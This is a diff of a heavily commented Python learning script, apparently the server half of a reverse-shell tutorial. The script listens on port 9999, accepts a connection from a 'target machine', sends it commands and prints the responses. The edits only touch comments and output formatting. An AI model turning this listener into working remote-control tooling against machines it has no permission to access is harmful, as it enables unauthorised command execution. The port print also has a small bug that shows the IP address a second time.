@@ -9,7 +9,7 @@ def socket_create(): #create a function called socket_create
     try: #try/catch
         global host #ip address where you connect to
         global port #port is a way where data is coming in (helps undefentify)
-        global s
+        global s #server
         host = ''
         port = 9999 #try not to use the common port (for testing)
         s = socket.socket() #s is where /socket or conversation between the computers/servers and target machine.
@@ -41,7 +41,7 @@ def socket_accept():
     conn, address = s.accept() #when you connect to a client
     #conn = references the connection itsefl, (so the conversation)
     #address = info of whoever connected
-    print("Connection has been established |" + "IP" + address[0] + " | Port" + str(address[0]))
+    print("Connection has been established |" + "IP: " + address[0] + " | Port: " + str(address[0]))
     send_commands(conn)
     conn.close()
 
@@ -59,7 +59,7 @@ def send_commands(conn):
         if len(str.encode(cmd)) > 0: #has to greather than 0 characters
             conn.send(str.encode(cmd))
             client_response = str(conn.recv(1024), "utf-8") #when we get the response its gonna be in btyes so we have to convert to string
-            print(client_response, end="") #end="" dont give us a new line characred at the endd
+            print(client_response,'\n') #'\n' or (pip3 ->)end="" dont give us a new line characred at the endd
 
 def main():
     socket_create()
@@ -68,3 +68,5 @@ def main():
     #we dont have to add the send_commands whenever connection accepted automatically calls teh send_commands
 
 main()
+#input()
+print(sys.version)
